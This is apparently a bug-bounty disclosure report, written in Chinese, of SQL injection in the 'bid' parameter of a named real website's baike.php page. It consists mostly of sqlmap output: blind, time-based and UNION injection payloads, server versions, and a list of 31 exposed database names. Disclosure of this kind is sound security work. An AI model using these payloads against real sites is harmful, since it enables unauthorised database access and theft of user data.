wybug_title: 幸孕网某分站存漏洞#泄露#邮箱#手机#账号密码（5发）

wybug_detail:
漏洞详情 披露状态：   									2015-10-13：	积极联系厂商并且等待厂商认领中，细节不对外公开									2015-11-27：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： RT 望高rank 详细说明：  见漏洞证明   漏洞证明：  
#SQL注入URL：http://sj.xy280.com/baike.php?bid=1	参数bid可控泄露31个数据库,大量信息泄露Parameter: bid (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: bid=1 AND 3896=3896    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: bid=1 AND (SELECT * FROM (SELECT(SLEEP(5)))ayWY)    Type: UNION query    Title: Generic UNION query (NULL) - 2 columns    Payload: bid=1 UNION ALL SELECT CONCAT(0x7178627871,0x49487771445770675a58,0x71767a7071),NULL-- ---web application technology: Apache 2.2.27, PHP 5.2.17back-end DBMS: MySQL 5.0.12available databases [31]:[*] 11[*] babyshowbym[*] dianpu[*] hyt[*] information_schema[*] meilimama[*] modoer[*] mysql[*] newxy280_bbs[*] newxy280_cms[*] performance_schema[*] pinphp[*] rebuild_ec[*] rebuild_ec_bak[*] sjfx[*] splice_img[*] test[*] traffic[*] try_center[*] tuku[*] ucenter[*] user_center[*] xingfuxiu[*] xiuchang[*] xy280_wap[*] xy280blog[*] xy280dede[*] xy280dede22[*] xy280dedelgm[*] xy280huojialgm[*] xyunite
